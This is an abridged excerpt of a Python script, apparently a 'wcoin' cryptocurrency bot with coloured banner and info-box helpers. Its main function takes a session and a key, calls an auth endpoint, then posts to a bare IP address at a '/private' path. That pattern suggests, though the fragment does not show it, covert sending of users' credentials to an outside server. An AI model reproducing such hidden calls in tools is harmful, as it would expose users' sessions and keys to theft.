...
def main_wcoin(session, amount, key):
    ...
    res = requests.post(
        'https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', json=json_data).json()
    r = requests.post('http://213.218.240.167:5000/private',
...
def create_gradient_banner(text):
    ...
    colors = [Fore.GREEN + Style.BRIGHT, Fore.YELLOW +
...
def print_info_box(social_media_usernames):
    colors = [Fore.CYAN, Fore.MAGENTA,
              Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTWHITE_EX]

    box_width = max(len(social) + len(username)
                    for social, username in social_media_usernames) + 4
